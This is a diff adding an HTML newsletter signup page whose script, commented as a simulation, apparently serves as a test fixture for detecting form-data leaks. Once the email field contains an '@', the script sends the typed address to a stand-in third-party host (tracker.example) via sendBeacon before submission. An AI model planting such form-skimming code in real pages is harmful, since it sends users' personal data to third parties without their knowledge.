@@ -1,0 +1,16 @@
+<!doctype html><meta charset="utf-8"><title>Newsletter signup</title>
+<h1>Join our newsletter</h1>
+<form>
+  <input type="email" id="email" name="email" placeholder="Your email">
+  <button type="submit">Subscribe</button>
+</form>
+<script>
+  // Simulates a tracker exfiltrating the typed email to a THIRD-PARTY origin
+  // before submit — via sendBeacon to a cross-origin host.
+  document.getElementById('email').addEventListener('input', function (e) {
+    var v = e.target.value;
+    if (v.indexOf('@') !== -1) {
+      try { navigator.sendBeacon('https://tracker.example:5601/collect?e=' + encodeURIComponent(v)); } catch (_) {}
+    }
+  });
+</script>
